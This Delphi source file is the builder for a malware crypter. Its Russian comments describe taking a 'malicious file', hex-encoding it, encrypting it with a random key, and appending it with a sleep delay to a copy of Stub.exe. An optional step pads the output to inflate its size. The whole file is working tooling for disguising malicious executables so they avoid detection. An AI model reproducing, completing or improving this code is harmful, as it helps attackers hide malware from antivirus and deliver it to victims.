unit Builder;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.Buttons, sSpeedButton,
  Vcl.Mask, sMaskEdit, sCustomComboEdit, sToolEdit, sSpinEdit, Vcl.StdCtrls,
  sEdit, sDialogs, Vcl.ComCtrls, sStatusBar, sCheckBox;

type
  TForm1 = class(TForm)
    sEdit1: TsEdit;
    sSpinEdit1: TsSpinEdit;
    sFilenameEdit1: TsFilenameEdit;
    sSpeedButton1: TsSpeedButton;
    sSaveDialog1: TsSaveDialog;
    sSpeedButton2: TsSpeedButton;
    sStatusBar1: TsStatusBar;
    sCheckBox1: TsCheckBox;
    sSpinEdit2: TsSpinEdit;
    procedure sSpeedButton1Click(Sender: TObject);
    procedure sSpeedButton2Click(Sender: TObject);
    procedure sCheckBox1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}


//Метод из файла сохраняет в hex код
function FileToStrHex(FileName: string): string;
var
  A: array of Byte;
  FS: TFileStream;

  function bintostr(const bin: array of byte): string;
  const
    HexSymbols = '0123456789ABCDEF';
  var
    i: integer;
  begin
    SetLength(Result, 2 * Length(bin));
    for i := 0 to Length(bin) - 1 do
    begin
      Result[1 + 2 * i + 0] := HexSymbols[1 + bin[i] shr 4];
      Result[1 + 2 * i + 1] := HexSymbols[1 + bin[i] and $0F];
    end;
  end;

begin
  FS := TFileStream.Create(FileName, fmOpenRead);
  try
    SetLength(A, FS.Size);
    if FS.Size > 0 then
      FS.ReadBuffer(Pointer(A)^, FS.Size);
    Result := bintostr(A);
  finally
    FreeAndNil(FS);
  end;
end;

//Метод пишем строку в конец кода исполняемого файла
procedure WriteStringToFile(Str, FileName: string);
var
  SHex: string;
  Len: Integer;
  Buf: array of Byte;
  FS: TFileStream;
  I: Integer;

  function StrToHex(source: string): string;
  var
    i: Integer;
    c: Char;
    s: string;
  begin
    s := '';
    for i := 1 to Length(source) do
    begin
      c := source[i];
      s := s + IntToHex(Integer(c), 2);
    end;
    result := s;
  end;

begin
  SHex := StrToHex(Str);

  Len := Length(SHex);
  if (Len > 0) and (Len mod 2 = 0) then
  begin
    SetLength(Buf, Len div 2);
    I := 0;
    while (I <= High(Buf)) do
    begin
      Buf[I] := StrToInt('$' + Copy(SHex, I * 2 + 1, 2));
      Inc(I)
    end
  end;
  FS := TFileStream.Create(FileName, fmOpenReadWrite);
  try
    FS.Position := FS.Size;
    if Length(Buf) > 0 then
    begin
      FS.WriteBuffer(Pointer(Buf)^, Length(Buf));
    end;
  finally
    FreeAndNil(FS);
  end;
end;

//Метод рандом строки
function RandomStr(StrLen: Integer): string;
const
  PWlen = '0123456789';
var
  i: Integer;
begin
  SetLength(Result, StrLen);
  Randomize;
  for i := 1 to StrLen do
    Result[i] := PWlen[Random(Length(PWlen)) + 1];
end;

//Метод шифрования строки
function EnCode(text, password: Ansistring): AnsiString;
var
  i, PasswordLength: integer;
  sign: shortint;
begin
  PasswordLength := length(password);
  if PasswordLength = 0 then
    Exit;
  sign := 1;
  for i := 1 to Length(text) do
  begin
    text[i] := Ansichar(ord(text[i]) + sign * ord(password[i mod PasswordLength + 1]));
    Result := Result + AnsiString(text[i]);
  end;
end;

//Метод добавить вес файлу
function PumpExe(Value: Int64; FileName: string): boolean;
var
  Temp: TFileStream;
begin
  try
    Temp := TFileStream.Create(FileName, fmOpenWrite);
    Temp.Size := Temp.Size + Value;
    Temp.Free;
    Result := True;
  except
    Result := False;
  end;
end;

procedure TForm1.sSpeedButton1Click(Sender: TObject);
var
  Stub, WriteTo: string;
  FileName, Key, Del, SleepEx: Ansistring;
begin
  //Разделитель
  Del := 'DelimiterStub';

  //Путь до стаба
  Stub := extractfilepath(paramstr(0)) + 'Stub.exe';

  //Если стаба нет то выходим
  if not fileexists(Stub) then
    exit;

  //Ключ шифрования
  Key := AnsiString(sEdit1.Text);

  //Получаем вредоносный файл
  FileName := AnsiString(sFileNameEdit1.Text);

  //Если файла нет то выходим
  if not fileexists(string(AnsiString(FileName))) then
    exit;

  //Вредоносный файл переводим в hex код
  FileName := AnsiString(FileToStrHex(string(AnsiString(FileName))));

  //Шифруем hex код вредоносного файла
  FileName := EnCode(AnsiString(FileName), AnsiString(Key));

  //Задержка исполнения кода
  SleepEx := AnsiString(sSpinEdit1.Text + '000');

  //Пишем всё наше добро в строковый тип данных
  WriteTo := string(AnsiString(Del)) + string(AnsiString(FileName))
  + string(AnsiString(Del)) + string(AnsiString(Key))
  + string(AnsiString(Del)) + string(AnsiString(SleepEx))
  + string(AnsiString(Del));

  if sSaveDialog1.Execute then
  begin
    //Копируем стаб
    CopyFile(PChar(Stub), PChar(sSaveDialog1.FileName), false);

   //Пишем в стаб
    WriteStringToFile(WriteTo, sSaveDialog1.FileName);

    //Добавляем вес
    if sCheckBox1.Checked then
       PumpExe(StrToInt64(sSpinEdit2.Text), sSaveDialog1.FileName);

    ShowMessage('Good Build!!!');
  end
  else
  begin
    ShowMessage('Error...');
  end;
end;

procedure TForm1.sSpeedButton2Click(Sender: TObject);
begin
//Рандомизируем ключ шифрования
  sEdit1.Text := RandomStr(40);
end;

procedure TForm1.sCheckBox1Click(Sender: TObject);
begin
if sCheckBox1.Checked then
sSpinEdit2.Enabled := True
else
sSpinEdit2.Enabled := False;
end;

end.

